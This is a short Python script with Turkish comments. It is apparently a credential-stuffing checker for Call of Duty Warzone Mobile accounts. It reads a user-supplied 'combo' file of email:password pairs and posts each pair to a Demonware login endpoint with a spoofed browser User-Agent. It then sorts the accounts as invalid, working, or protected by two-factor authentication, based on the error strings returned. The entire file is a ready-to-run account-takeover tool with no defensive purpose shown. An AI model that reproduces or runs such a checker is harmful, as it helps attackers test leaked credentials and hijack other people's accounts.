import requests

def denemecod(email, sifre):
    url = "https://wzm-and-loginservice.prod.demonware.net/v1/login/uno/?titleID=7100&client=atvimobile-cod-wzm-and"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Host": "wzm-and-loginservice.prod.demonware.net"
    }
    payload = {
        "version": 1538,
        "platform": "and",
        "hardwareType": "and",
        "auth": {
            "email": email,
            "password": sifre
        }
    }
    response = requests.post(url, json=payload, headers=headers)
    return response.text

def legalicanim(dosya_yolu):
    with open(dosya_yolu, 'r') as dosya:
        for satir in dosya:
            email, sifre = satir.strip().split(':')
            yanit = denemecod(email, sifre)
            if any(kelime in yanit for kelime in [
                "The provided credentials are invalid.",
                "code\": 220000",
                "Error:ClientError:Unauthorized",
                "Error:DownStreamError:DownstreamUnauthorized",
                "Request is invalid or some preconditions were not met"
            ]):
                print(f"{email}:{sifre} - Hatalı (Geçersiz bilgiler)")
            elif any(kelime in yanit for kelime in [
                "Error:ClientError:CountryBlockedError",
                "authenticate",
                "Error:DownStreamError:DownstreamBadRequest",
                "loginTicket"
            ]):
                print(f"{email}:{sifre} - Çalışan (Başarıyla doğrulandı)")
            elif "Error:ClientError:Uno2FAChallenge" in yanit:
                print(f"{email}:{sifre} - 2FACTOR (İki faktörlü doğrulama gerekiyor)")
            else:
                print(f"{email}:{sifre} - Bilinmeyen durum ({yanit[:50]}...)")  # Yanıtın ilk 50 karakterini gösterir.

# Kullanıcıdan combo dosyası yolunu alma
combo_dosyasi = input("Lütfen combo dosyasının yolunu giriniz: ")
legalicanim(combo_dosyasi)
